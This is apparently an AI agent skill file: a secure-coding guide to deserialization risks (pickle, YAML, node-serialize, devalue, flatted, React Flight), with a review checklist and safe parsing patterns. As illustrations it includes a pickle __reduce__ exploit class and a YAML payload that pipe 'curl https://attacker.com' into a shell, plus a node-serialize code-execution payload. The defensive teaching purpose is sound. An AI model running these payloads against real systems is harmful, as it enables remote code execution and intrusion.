---
name: deserialization-attacks
description: Detection and defense against unsafe deserialization vulnerabilities across all boundaries where data becomes code. Use when reviewing code that deserializes user input, parses structured data formats (JSON, YAML, XML, MessagePack, Protocol Buffers), uses React Flight/RSC protocol, handles webhooks, processes file uploads, reads cached data, or uses any library that reconstructs objects from wire format. Covers React Flight (CVE-2025-55182), Svelte devalue (CVE-2026-30226), flatted (CVE-2026-33228), Python pickle, YAML load, Node.js node-serialize, and every deserialization boundary in our Next.js + Supabase stack.
---

# Deserialization Attacks

## The Principle

**Deserialization = data becomes code.** Any point where an external byte stream is reconstructed into live objects in memory is an attack surface. If the attacker controls the byte stream, they can control what objects get created and what code runs.

## Risk Tiers by Language/Format

| Format | Language | Can Execute Code? | Risk |
|--------|----------|-------------------|------|
| `pickle.loads()` | Python | Yes — `__reduce__` | CRITICAL |
| `marshal.loads()` | Python | Yes — bytecode | CRITICAL |
| `yaml.load()` (unsafe) | Python | Yes — `!!python/object` | CRITICAL |
| `node-serialize` | Node.js | Yes — `_$$ND_FUNC$$_` | CRITICAL |
| React Flight | JS/Node | Yes — CVE-2025-55182 | CRITICAL |
| `unserialize()` | PHP | Yes — magic methods | CRITICAL |
| Java `ObjectInputStream` | Java | Yes — gadget chains | CRITICAL |
| `JSON.parse()` | JS/Node | No (data only) | LOW* |
| `devalue.parse()` | JS/Node | No** — but prototype pollution | HIGH |
| `flatted.parse()` | JS/Node | No** — but prototype pollution | HIGH |
| XML/SAML | Any | XXE, XSW possible | HIGH |
| MessagePack | Any | No (data only) | LOW |
| Protocol Buffers | Any | No (schema enforced) | LOW |

*JSON.parse is safe by itself, but the OUTPUT flows into vulnerable merge/assign operations → prototype pollution → gadget chains → RCE.

**devalue and flatted are "safe" serializers that have had prototype pollution CVEs allowing indirect code execution.

## Our Stack's Deserialization Boundaries

### Boundary 1: React Flight Protocol (RSC)
**Where**: Every Next.js App Router page that uses Server Components
**What flows**: Component trees, props, Server Action arguments, streaming chunks
**Risk**: CVE-2025-55182 — unsafe deserialization → prototype pollution → RCE
**Defense**: Keep Next.js patched. See `react-flight-security` skill.

### Boundary 2: Server Action Arguments
**Where**: Every `"use server"` function
**What flows**: FormData, serialized arguments from client
**Risk**: Type confusion, unexpected object shapes, missing validation
**Defense**: Zod validation on every Server Action input. Never trust the shape.

### Boundary 3: API Route Request Bodies
**Where**: Every API route handler
**What flows**: JSON.parse'd request bodies
**Risk**: Prototype pollution if merged into objects; type confusion
**Defense**: Validate with Zod. Use `Object.create(null)` for merge targets.

### Boundary 4: Webhook Payloads
**Where**: Stripe webhooks, GitHub webhooks, any external callback
**What flows**: JSON payloads from external services
**Risk**: Forged payloads if signature not verified; type confusion
**Defense**: Always verify webhook signatures BEFORE parsing body.

### Boundary 5: Supabase Realtime Messages
**Where**: Supabase Realtime subscriptions
**What flows**: Postgres changes broadcast as JSON
**Risk**: If attacker can write to subscribed table, they control the payload shape
**Defense**: Validate incoming realtime payloads before using them.

### Boundary 6: File Uploads
**Where**: Image processing, document parsing, CSV import
**What flows**: Binary file content
**Risk**: Malicious files that exploit parsers (image bombs, XML bombs, CSV injection)
**Defense**: Validate file type server-side (magic bytes, not extension). Process in sandbox.

### Boundary 7: Cache/Session Deserialization
**Where**: Redis, in-memory cache, session stores
**What flows**: Previously serialized application state
**Risk**: Cache poisoning → deserialization of attacker-controlled data
**Defense**: Validate cache data after deserialization, not just before serialization.

## Python Deserialization (for our AI/backend services)

### pickle — The Most Dangerous Deserializer
```python
# VULNERABLE — arbitrary code execution
import pickle
data = pickle.loads(user_input)  # NEVER do this with untrusted input

# How it works: __reduce__ method
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl https://attacker.com | sh",))
# When unpickled, os.system("curl...") is called
```

**Rule**: NEVER use `pickle.loads()` on untrusted input. Period. Use `json.loads()` instead.

### yaml.load — Hidden RCE
```python
# VULNERABLE
import yaml
data = yaml.load(user_input)  # Unsafe loader by default in older versions

# Attack payload:
# !!python/object/apply:os.system ["curl https://attacker.com | sh"]
```

**Fix**: Always use `yaml.safe_load()`:
```python
data = yaml.safe_load(user_input)  # Only constructs basic Python types
```

### marshal — Bytecode Execution
```python
# DANGEROUS — executes compiled Python bytecode
import marshal
code = marshal.loads(user_input)
exec(code)  # Combined with our malicious-code-patterns skill
```

## Node.js Deserialization

### node-serialize (known vulnerable)
```javascript
// VULNERABLE — contains eval-based deserialization
const serialize = require('node-serialize')
const obj = serialize.unserialize(userInput)

// Attack payload:
// {"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

**Rule**: Never use `node-serialize`. It's inherently unsafe.

### devalue (Svelte/SvelteKit) — CVE-2025-57820, CVE-2026-30226
```javascript
// VULNERABLE in older versions — prototype pollution via unflatten
const devalue = require('devalue')
const obj = devalue.parse(userInput)
// If input contains __proto__ references, global prototype is polluted
```

**Fix**: Upgrade to devalue ≥5.6.4

### flatted — CVE-2026-33228
```javascript
// VULNERABLE — parse() returns object with live Array.prototype reference
const flatted = require('flatted')
const obj = flatted.parse(craftedInput)
// Downstream writes to the returned object can pollute global prototype
```

**Fix**: Upgrade to patched version. Validate output before using.

## Detection Checklist for Code Review

### Immediate Flags (P0 if untrusted input)
- [ ] `pickle.loads()`, `pickle.load()` — Python
- [ ] `yaml.load()` without `Loader=yaml.SafeLoader` — Python
- [ ] `marshal.loads()` — Python
- [ ] `node-serialize.unserialize()` — Node.js
- [ ] Any custom deserializer that uses `eval()`, `exec()`, `new Function()`
- [ ] `__import__('pickle').loads()` (obfuscated pickle)

### High Priority (check version + input source)
- [ ] React Flight protocol (check Next.js version for CVE-2025-55182)
- [ ] `devalue.parse()` / `devalue.unflatten()` (check version for CVE-2026-30226)
- [ ] `flatted.parse()` (check version for CVE-2026-33228)
- [ ] Any XML parser without XXE protection
- [ ] `JSON.parse()` whose output flows into `Object.assign()` or deep merge

### Medium Priority (verify boundary hardening)
- [ ] Webhook handlers — is signature verified before parsing?
- [ ] File upload handlers — is content validated (not just extension)?
- [ ] Cache reads — is deserialized data validated?
- [ ] Supabase Realtime — are message shapes validated?

## Safe Deserialization Patterns

### JavaScript: Parse + Validate
```typescript
import { z } from 'zod'

const WebhookSchema = z.object({
  type: z.enum(['payment_intent.succeeded', 'payment_intent.failed']),
  data: z.object({
    id: z.string(),
    amount: z.number().positive(),
  })
})

// 1. Verify signature FIRST
verifyStripeSignature(rawBody, signature)

// 2. Parse
const raw = JSON.parse(rawBody)

// 3. Validate shape immediately after parsing
const event = WebhookSchema.parse(raw)

// 4. Now safe to use
processPayment(event.data)
```

### Python: Use JSON, Never Pickle for External Data
```python
import json
from pydantic import BaseModel

class WebhookPayload(BaseModel):
    type: str
    data: dict

# Parse + validate in one step
payload = WebhookPayload.model_validate_json(raw_body)
```

### Freeze Objects After Deserialization
```javascript
// Prevent prototype pollution from propagating
const parsed = JSON.parse(untrustedInput)
const frozen = Object.freeze(parsed)
// frozen cannot be used to pollute prototypes
```

## References

For prototype pollution exploitation chains, see `prototype-pollution-chains` skill.
For React Flight protocol details, see `react-flight-security` skill.
For Python-specific patterns, see `malicious-code-patterns` skill.
